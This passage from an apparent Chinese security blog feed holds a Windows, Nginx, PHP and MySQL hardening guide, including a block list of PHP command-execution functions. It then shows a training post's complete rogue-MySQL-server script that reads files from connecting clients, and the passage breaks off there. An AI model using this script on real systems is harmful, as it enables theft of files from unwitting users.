137（netbios-ns）、UDP 138（netbios-dgm）以及 TCP 139（netbios-ssn）端口。</p><p><strong>操作步骤</strong></p><ol><li>在 <strong>计算机管理</strong> &gt; <strong>服务和应用程序</strong> &gt; <strong>服务</strong> 中禁用 <strong>TCP/IP NetBIOS Helper</strong> 服务。</li><li>在网络连接属性中，双击 <strong>Internet 协议版本 4（TCP/IPv4）</strong>，单击 <strong>高级</strong>。在 <strong>WINS</strong> 页签中，进行如下设置：</li></ol><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719201146423.png" alt="image-20240719201146423"></p><h3 id="禁用不必要的服务"><a href="#禁用不必要的服务" class="headerlink" title="禁用不必要的服务"></a>禁用不必要的服务</h3><div class="table-container"><table><thead><tr><th><strong>服务名</strong></th><th><strong>建议</strong></th></tr></thead><tbody><tr><td>DHCP Client</td><td>如果不使用动态 IP, 则建议关闭</td></tr><tr><td>Background Intelligent Transfer Service</td><td>如果不启用自动更新，建议关闭</td></tr><tr><td>ComputerBrowser</td><td>建议关闭</td></tr><tr><td>Diagnostic Policy Service</td><td>建议手动</td></tr><tr><td>IP Helper</td><td>如果不用双栈建议关闭</td></tr><tr><td>PrintSpooler</td><td>如果不使用打印服务，建议关闭</td></tr><tr><td>Remote Registry</td><td>建议关闭</td></tr><tr><td>TCP/IP NetBIOS Helper</td><td>建议关闭</td></tr><tr><td>Windows Remote ManageMent</td><td>建议关闭</td></tr><tr><td>Windows Font Cache Service</td><td>建议关闭</td></tr><tr><td>WinHTTP Web Proxy Auto-Discovery Service</td><td>建议关闭</td></tr></tbody></table></div><h2 id="安全选项"><a href="#安全选项" class="headerlink" title="安全选项"></a>安全选项</h2><h3 id="启动安全选项"><a href="#启动安全选项" class="headerlink" title="启动安全选项"></a>启动安全选项</h3><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，进行如下设置：</p><div class="table-container"><table><thead><tr><th><strong>安全选项</strong></th><th><strong>配置内容</strong></th></tr></thead><tbody><tr><td>交互式登录：试图登录的用户的消息标题</td><td>警告标题</td></tr><tr><td>交互式登录：试图登录的用户的消息文本</td><td>警告内容</td></tr><tr><td>Microsoft 网络服务器：对通信进行数字签名（如果客户端允许）</td><td>启用</td></tr><tr><td>Microsoft 网络服务器：对通信进行数字签名（始终）</td><td>启用</td></tr><tr><td>Microsoft 网络客户端：对通信进行数字签名（如果服务器允许）</td><td>启用</td></tr><tr><td>Microsoft 网络客户端：对通信进行数字签名（始终）</td><td>启用</td></tr><tr><td>网络安全：基于 NTLM SSP 的（包括安全 RPC）服务器的最小会话安全</td><td>要求 NTLMv2 会话安全要求 128 位加密</td></tr><tr><td>网络安全：基于 NTLM SSP 的（包括安全 RPC）客户端的最小会话安全</td><td>要求 NTLMv2 会话安全要求 128 位加密</td></tr><tr><td>网络安全：LAN 管理器身份验证级别</td><td>仅发送 NTLMv2 响应拒绝 LM&amp;NTLM</td></tr><tr><td>网络访问：不允许 SAM 帐户的匿名枚举</td><td>启用</td></tr><tr><td>网络访问：不允许 SAM 帐户和共享的匿名枚举</td><td>启用</td></tr><tr><td>网络访问：可匿名访问的共享</td><td>空</td></tr><tr><td>网络访问：可匿名访问的命名管道</td><td>空</td></tr><tr><td>网络访问：可远程访问的注册表路径</td><td>空，不允许远程访问注册表</td></tr><tr><td>网络访问：可远程访问的注册表路径和子路径</td><td>空，不允许远程访问注册表</td></tr></tbody></table></div><h3 id="禁用未登录前关机"><a href="#禁用未登录前关机" class="headerlink" title="禁用未登录前关机"></a>禁用未登录前关机</h3><p>服务器默认是禁止在未登录系统前关机的。如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客造成可乘之机，强烈建议禁用未登录前关机功能。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，禁用 <strong>关机：允许系统在未登录前关机</strong> 策略。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719201413913.png" alt="image-20240719201413913"></p><h2 id="其他安全配置"><a href="#其他安全配置" class="headerlink" title="其他安全配置"></a>其他安全配置</h2><h3 id="防病毒管理"><a href="#防病毒管理" class="headerlink" title="防病毒管理"></a>防病毒管理</h3><p>Windows 系统需要安装防病毒软件。</p><p><strong>操作步骤</strong></p><p>安装企业级防病毒软件，并开启病毒库更新及实时防御功能。</p><h3 id="设置屏幕保护密码和开启时间"><a href="#设置屏幕保护密码和开启时间" class="headerlink" title="设置屏幕保护密码和开启时间"></a>设置屏幕保护密码和开启时间</h3><p>设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。</p><p><strong>操作步骤</strong></p><p>启用屏幕保护程序，设置等待时间为 <strong>5 分钟</strong>，并启用 <strong>在恢复时使用密码保护</strong>。</p><h3 id="限制远程登录空闲断开时间"><a href="#限制远程登录空闲断开时间" class="headerlink" title="限制远程登录空闲断开时间"></a>限制远程登录空闲断开时间</h3><p>对于远程登录的帐户，设置不活动超过时间 15 分钟自动断开连接。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，设置 <strong>Microsoft 网络服务器：暂停会话前所需的空闲时间数量</strong> 属性为 15 分钟。</p><h3 id="操作系统补丁管理"><a href="#操作系统补丁管理" class="headerlink" title="操作系统补丁管理"></a>操作系统补丁管理</h3><p>安装最新的操作系统 Hotfix 补丁。安装补丁时，应先对服务器系统进行兼容性测试。</p><p><strong>操作步骤</strong></p><p>安装最新的操作系统 Hotfix 补丁。安装补丁时，应先对服务器系统进行兼容性测试。</p><p><strong>注意</strong>：对于实际业务环境服务器，建议使用通知并自动下载更新，但由管理员选择是否安装更新，而不是使用自动安装更新，防止自动更新补丁对实际业务环境产生影响。</p><h3 id="开启本地防火墙"><a href="#开启本地防火墙" class="headerlink" title="开启本地防火墙"></a>开启本地防火墙</h3><p>执行firewall.cpl，开启防火墙</p><h1 id="Nginx安全加固"><a href="#Nginx安全加固" class="headerlink" title="Nginx安全加固"></a>Nginx安全加固</h1><h2 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h2><p>适用于使用Nginx进行部署的Web网站。</p><h2 id="技能要求"><a href="#技能要求" class="headerlink" title="技能要求"></a>技能要求</h2><p>熟悉Nginx配置，能够Nginx进行部署，并能针对站点使用Nginx进行安全加固。</p><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>1、 根据站点开放端口，进程ID，确认站点采用Nginx进行部署；</p><p>2、 找到Nginx安装目录，针对具体站点对配置文件进行修改；</p><p>3、 在执行过程中若有任何疑问或建议，应及时反馈。</p><h2 id="详细操作"><a href="#详细操作" class="headerlink" title="详细操作"></a>详细操作</h2><h3 id="日志配置-1"><a href="#日志配置-1" class="headerlink" title="日志配置"></a>日志配置</h3><p>1、备份nginx.conf 配置文件。</p><p>修改配置，按如下设置日志记录文件、记录内容、记录格式，添加标签为main的log_format格式(http标签内，在所有的server标签内可以调用)：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">log_format  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">   <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">   <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719112254678.png" alt="image-20240719112254678"></p><p>2、在server标签内，定义日志路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">access_log logs/host.access.log main;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719112558516.png" alt=""></p><p>3、保存，然后后重启nginx服务。</p><h3 id="禁止目录浏览"><a href="#禁止目录浏览" class="headerlink" title="禁止目录浏览"></a>禁止目录浏览</h3><p>备份nginx.conf配置文件。</p><p>编辑配置文件，HTTP模块添加如下一行内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">autoindex off;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719141702794.png" alt="image-20240719141702794"></p><p>保存，然后后重启nginx服务。</p><h3 id="限制目录执行权限"><a href="#限制目录执行权限" class="headerlink" title="限制目录执行权限"></a>限制目录执行权限</h3><p>备份nginx.conf配置文件。</p><p>编辑配置文件，在server标签内添加如下内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例：去掉单个目录的PHP执行权限</span></span><br><span class="line">location ~ /attachments/.*\.(php|php5)?$ &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：去掉多个目录的PHP执行权限</span></span><br><span class="line">location ~</span><br><span class="line">/(attachments|upload)/.*\.(php|php5)?$ &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719142132904.png" alt="image-20240719142132904"></p><p>保存，然后后重启nginx服务。</p><p>需要注意两点：</p><ol><li>以上的配置文件代码需要放到 location ~ .php{…}上面，如果放到下面是无效的;</li><li>attachments需要写相对路径，不能写绝对路径。</li></ol><h3 id="最佳经验实践"><a href="#最佳经验实践" class="headerlink" title="最佳经验实践"></a>最佳经验实践</h3><h4 id="隐藏版本信息"><a href="#隐藏版本信息" class="headerlink" title="隐藏版本信息"></a>隐藏版本信息</h4><p>备份nginx.conf配置文件。</p><p>编辑配置文件，添加http模块中如下一行内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">server_tokens off;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719142449159.png" alt="image-20240719142449159"></p><h4 id="限制HTTP请求方法"><a href="#限制HTTP请求方法" class="headerlink" title="限制HTTP请求方法"></a>限制HTTP请求方法</h4><p>备份nginx.conf配置文件。</p><p>编辑配置文件，添加如下内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$request_method</span> !~ ^(GET|HEAD|POST)$ ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样只允许常用的GET和POST方法，以及HEAD方法，其他的方法都被禁用了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719143157005.png" alt="image-20240719143157005"></p><h4 id="限制IP访问"><a href="#限制IP访问" class="headerlink" title="限制IP访问"></a>限制IP访问</h4><p>备份nginx.conf配置文件。</p><p>编辑配置文件，在server标签内添加如下内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">deny <span class="number">192.168</span>.<span class="number">1.1</span>; <span class="comment">#拒绝IP</span></span><br><span class="line">allow <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span>; <span class="comment">#允许IP</span></span><br><span class="line">allow <span class="number">10.1</span>.<span class="number">1.0</span>/<span class="number">16</span>; <span class="comment">#允许IP</span></span><br><span class="line">deny all; <span class="comment">#拒绝其他所有IP</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719143551552.png" alt="image-20240719143551552"></p><h4 id="限制并发和速度"><a href="#限制并发和速度" class="headerlink" title="限制并发和速度"></a>限制并发和速度</h4><p>备份nginx.conf配置文件。</p><p>编辑配置文件，在server标签内添加如下内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">limit_zone one <span class="variable">$binary_remote_addr</span> <span class="number">10</span>m;</span><br><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">     listen   <span class="number">80</span>;</span><br><span class="line">     server_name down.test.com;</span><br><span class="line">     index index.html index.htm index.php;</span><br><span class="line">     root  /usr/local/www;</span><br><span class="line">     <span class="comment">#Zone limit;</span></span><br><span class="line">     location / &#123;</span><br><span class="line">         limit_conn one <span class="number">1</span>;</span><br><span class="line">         limit_rate <span class="number">20</span>k;</span><br><span class="line">     &#125;</span><br><span class="line">………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719143925838.png" alt="image-20240719143925838"></p><h4 id="控制超时时间"><a href="#控制超时时间" class="headerlink" title="控制超时时间"></a>控制超时时间</h4><p>备份nginx.conf配置文件。</p><p>编辑配置文件，具体设置如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">client_body_timeout <span class="number">10</span>;  <span class="comment">#设置客户端请求主体读取超时时间</span></span><br><span class="line">client_header_timeout <span class="number">10</span>;  <span class="comment">#设置客户端请求头读取超时时间</span></span><br><span class="line">keepalive_timeout <span class="number">5</span> <span class="number">5</span>;  <span class="comment">#第一个参数指定客户端连接保持活动的超时时间，第二个参数是可选的，它指定了消息头保持活动的有效时间</span></span><br><span class="line">send_timeout <span class="number">10</span>;  <span class="comment">#指定响应客户端的超时时间</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719144047102.png" alt="image-20240719144047102"></p><h1 id="对php-5-4配置进行加固"><a href="#对php-5-4配置进行加固" class="headerlink" title="对php 5.4配置进行加固"></a>对php 5.4配置进行加固</h1><h2 id="PHP基线检查及加固概述"><a href="#PHP基线检查及加固概述" class="headerlink" title="PHP基线检查及加固概述"></a>PHP基线检查及加固概述</h2><p>PHP的安检和加固项通常在php.ini的配置文件中进行配置</p><h2 id="启用PHP的安全模式"><a href="#启用PHP的安全模式" class="headerlink" title="启用PHP的安全模式"></a>启用PHP的安全模式</h2><p>注意： PHP &lt;=5.2 环境适用的安全模式是一个非常重要的内嵌安全机制，PHP 安全模式能有效控制一些 PHP 环境中的函数（例如system()函数），对大部分的文件操作函数进行权限控制，同时不允许对某些关键文件进行修改（例如 /etc/passwd）。但是，默认的 php.ini 配置文件并没有启用安全模式。<br>您可以通过修改 php.ini 配置文件启用 PHP 安全模式：safe_mode = on</p><h2 id="控制-PHP-脚本能访问的目录"><a href="#控制-PHP-脚本能访问的目录" class="headerlink" title="控制 PHP 脚本能访问的目录"></a>控制 PHP 脚本能访问的目录</h2><p>使用open_basedir选项能够控制 PHP 脚本只能访问指定的目录，这样能够避免 PHP 脚本访问不应该访问的文件，一定程度下降低了 phpshell 的危害。一般情况下，可以设置为只能访问网站目录：<code>open_basedir = &quot;/var/www/html:/tmp&quot;</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719153941691.png" alt="image-20240719153941691"></p><h2 id="关闭危险函数"><a href="#关闭危险函数" class="headerlink" title="关闭危险函数"></a>关闭危险函数</h2><p>如果您启用了安全模式，那么可以不需要设置函数禁止，但为了安全考虑，还是建议您进行相关设置。例如，您不希望执行包括system()等在内的执行命令的 PHP 函数，以及能够查看 PHP 信息的phpinfo()等函数，那么您可以通过以下设置禁止这些函数：<br><code>disable_functions = system, passthru, exec, shell_exec, popen, phpinfo, escapeshellarg, escapeshellcmd, proc_close, proc_open</code><br>如果您想要禁止对于任何文件和目录的操作，那么您可以关闭以下文件相关操作。<br><code>disable_functions = chdir, chroot, dir, getcwd, opendir, readdir, scandir, fopen, unlink, delete, copy, mkdir, rmdir, rename, file, file_get_contents, fputs, fwrite,chgrp,chmod, chown</code><br>注意： 以上设置中只列举了部分比较常用的文件处理函数，您也可以将上面的执行命令函数和这些文件处理函数相结合，就能给抵制大部分的 phpshell 威胁。</p><h2 id="关闭PHP版本信息在HTTP头中的泄露"><a href="#关闭PHP版本信息在HTTP头中的泄露" class="headerlink" title="关闭PHP版本信息在HTTP头中的泄露"></a>关闭PHP版本信息在HTTP头中的泄露</h2><p>为了防止黑客获取服务器中 PHP 版本的信息，您可以禁止该信息在 HTTP 头部内容中泄露：<code>expose_php = off</code><br>这样设置之后，黑客在执行telnet <domain> 80尝试连接您的服务器的时候，将无法看到 PHP 的版本信息。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719154419581.png" alt="image-20240719154419581"></p><h2 id="关闭注册全局变量"><a href="#关闭注册全局变量" class="headerlink" title="关闭注册全局变量"></a>关闭注册全局变量</h2><p>注意： PHP &lt; = 5.2适用</p><p>在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量，都将自动注册为全局变量，能够被直接访问。这对您的服务器是非常不安全的，因此建议您将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。<br><code>register_globals = off</code></p><p>当然，如果这样设置之后，获取对应变量的时候就需要采取合理方式。例如，获取 GET 命令提交的变量 var，就需要使用$_GET[‘var’]命令来进行获取，在进行 PHP 程序设计时需要注意。</p><h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><p>注意： PHP &lt;= 5.3.0</p><p>SQL 注入是一个非常危险的问题，小则造成网站后台被入侵，重则导致整个服务器沦陷。<code>magic_quotes_gpc</code>选项默认是关闭的。如果打开该选项，PHP 将自动把用户提交对SQL 查询的请求进行转换（例如，把 ’ 转换为 \’ 等），这对于防止 SQL 注入攻击有很大作用，因此建议您将该选项设置为：<code>magic_quotes_gpc = on</code></p><p><strong>但是防止不了宽字节注入</strong></p><h2 id="错误信息控制"><a href="#错误信息控制" class="headerlink" title="错误信息控制"></a>错误信息控制</h2><p>一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息，错误信息中可能包含PHP脚本当前的路径信息或者查询的SQL语句等信息，这类信息如果暴露给黑客是不安全的，因此建议您禁止该错误提示：<code>display_errors = Off</code><br>如果您确实要显示错误信息，一定要设置显示错误信息的级别。例如，只显示警告以上的错误信息：<code>error_reporting = E_WARNING &amp; E_ERROR</code><br>注意： 强烈建议您关闭错误提示信息。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719154943790.png" alt="image-20240719154943790"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719155028420.png" alt="image-20240719155028420"></p><h2 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h2><p>建议您在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因：<code>log_errors = On</code></p><p>同时，需要设置错误日志存放的目录，建议您将 PHP 错误日志与 Apache 的日志存放在同一目录下：<code>error_log = /usr/local/apache2/logs/php_error.log</code></p><p>注意： 该文件必须设置允许 Apache 用户或用户组具有写的权限。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719155454701.png" alt="image-20240719155454701"></p><h1 id="扩展：对mysql服务进行配置，实现用户的权限限制"><a href="#扩展：对mysql服务进行配置，实现用户的权限限制" class="headerlink" title="扩展：对mysql服务进行配置，实现用户的权限限制"></a>扩展：对mysql服务进行配置，实现用户的权限限制</h1><h2 id="root用户登录到mysql"><a href="#root用户登录到mysql" class="headerlink" title="root用户登录到mysql"></a>root用户登录到mysql</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719165605967.png" alt="image-20240719165605967"></p><h2 id="创建数据库和用户"><a href="#创建数据库和用户" class="headerlink" title="创建数据库和用户"></a>创建数据库和用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建数据库</span><br><span class="line">CREATE DATABASE db_web1;</span><br><span class="line">-- 创建用户并设置密码</span><br><span class="line">CREATE USER &#x27;user_web1&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123456&#x27;;</span><br><span class="line">-- 授予用户对数据库的所有权限</span><br><span class="line">GRANT ALL PRIVILEGES ON db_web1.* TO &#x27;user_web1&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">-- 刷新权限</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719170328532.png" alt="image-20240719170328532"></p><p>我们先试着从本地登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u user_web1 -p</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719171245526.png" alt="image-20240719171245526"></p><p>这里显示我们的user_web1的权限能访问当前数据库</p><p>我们输入如下命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/mysql/conf.d/mysql.cnf</span><br></pre></td></tr></table></figure><p>输入<code>bind-address=0.0.0.0</code>后保存，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719171349450.png" alt="image-20240719171349450"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行 sudo systemctl restart mysql 重启服务</span><br></pre></td></tr></table></figure><p>用本机的navicat连接虚拟机的sql账户，在这之前先开启虚拟机的3306端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 3306</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/57c31bb18deee2678d258621948dba2e.png" alt="57c31bb18deee2678d258621948dba2e"></p><p>我们可以看到已经成功</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows安全加固 </tag>
            
            <tag> Linux安全加固 </tag>
            
            <tag> 中间件加固 </tag>
            
            <tag> PHP加固 </tag>
            
            <tag> MySQL加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>川大暑期实训-实现攻击反制</title>
      <link href="/post/dcf51467.html"/>
      <url>/post/dcf51467.html</url>
      
        <content type="html"><![CDATA[<h2 id="反制mysql客户端"><a href="#反制mysql客户端" class="headerlink" title="反制mysql客户端"></a>反制mysql客户端</h2><p>exp_dicc.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySQLFileReader</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, port</span>):</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sv = socket.socket()</span><br><span class="line">        self.sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sv.bind((<span class="string">&quot;&quot;</span>, port))</span><br><span class="line">        self.sv.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mysql_get_file_content</span>(<span class="params">self, filename</span>):</span><br><span class="line">        conn, address = self.sv.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;收到连接: <span class="subst">&#123;address[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        logpath = os.path.abspath(<span class="string">&#x27;.&#x27;</span>) + <span class="string">&quot;/log/&quot;</span> + address[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(logpath):</span><br><span class="line">            os.makedirs(logpath)</span><br><span class="line"></span><br><span class="line">        server_version = <span class="string">b&quot;\x0a\x35\x2e\x35\x2e\x35\x33&quot;</span></span><br><span class="line">        <span class="keyword">if</span> platform.system() == <span class="string">&quot;Linux&quot;</span>:</span><br><span class="line">            server_version = <span class="string">b&quot;\x0a\x35\x2e\x37\x2e\x32\x39&quot;</span></span><br><span class="line"></span><br><span class="line">        conn.sendall(<span class="string">b&quot;\x4a\x00\x00\x00&quot;</span> + server_version + <span class="string">b&quot;\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span>)</span><br><span class="line">        conn.recv(<span class="number">9999</span>)</span><br><span class="line">        conn.sendall(<span class="string">b&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">        conn.recv(<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        wantfile = (<span class="built_in">len</span>(filename) + <span class="number">1</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>) + <span class="string">b&quot;\x00\x00\x01\xFB&quot;</span> + filename.encode()</span><br><span class="line">        conn.sendall(wantfile)</span><br><span class="line">        content = conn.recv(<span class="number">9999</span>)</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt; <span class="number">4</span>:</span><br><span class="line">            content_str = content.decode()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(logpath + <span class="string">&quot;/&quot;</span> + Path(filename).name, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">                txt.write(content_str)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件内容: \n<span class="subst">&#123;content_str&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_files_from_input</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已在 <span class="subst">&#123;self.port&#125;</span> 端口启用MySQL蜜罐&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            filename = <span class="built_in">input</span>(<span class="string">&quot;请输入接下来你想读的文件名 (直接按回车退出): &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            res = self.mysql_get_file_content(filename)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件已保存 ---&gt; <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;文件未找到 ---&gt; <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_files_from_dict</span>(<span class="params">self, dict_file</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;已在 <span class="subst">&#123;self.port&#125;</span> 端口启用MySQL蜜罐&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dict_file) <span class="keyword">as</span> dicc:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> dicc.readlines():</span><br><span class="line">                line = line.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                res = self.mysql_get_file_content(line)</span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;文件已保存 ---&gt; <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;文件未找到 ---&gt; <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入监听端口号: &quot;</span>))</span><br><span class="line">    mode = <span class="built_in">input</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">请选择读取模式: </span></span><br><span class="line"><span class="string">【1】从输入读取文件</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    mysql_file_reader = MySQLFileReader(port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        mysql_file_reader.read_files_from_input()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的模式选择，请重新运行程序并输入正确的模式。&quot;</span>)</span><br></pre></td></tr></table></figure><p>在exp_dicc.py文件所在的目录下打开cmd</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python exp_dicc.py</span><br><span class="line">#设置监听端口<span class="number">3306</span></span><br><span class="line">#设置读取模式，这里选<span class="number">1</span>，输入读取文件的路径</span><br><span class="line"><span 